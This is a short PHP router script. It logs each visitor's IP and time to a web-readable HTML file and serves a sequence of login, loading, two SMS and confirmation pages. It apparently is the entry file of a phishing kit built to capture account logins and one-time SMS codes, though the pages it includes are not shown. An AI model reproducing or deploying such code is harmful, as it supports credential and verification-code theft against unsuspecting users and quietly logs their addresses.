<?php
$handle = fopen("visite.html", "a+");
fwrite($handle,"IP: ".getenv("REMOTE_ADDR")." TIME: ".date("Y-m-d H:i:s")." <br>");
fclose($handle);

			if( $_GET['stp'] == 'login' OR $_GET['stp'] == '' ) {

				include("files/login.php");

			}


			if( $_GET['stp'] == 'loading' ) {

				include("files/loading.php");

			}


			if( $_GET['stp'] == 'sms' ) {

				include("files/sms.php");

			}
			
			if( $_GET['stp'] == 'sms2' ) {

				include("files/sms2.php");

			}

			if( $_GET['stp'] == 'confirmation' ) {

				include("files/success.php");

			}


?>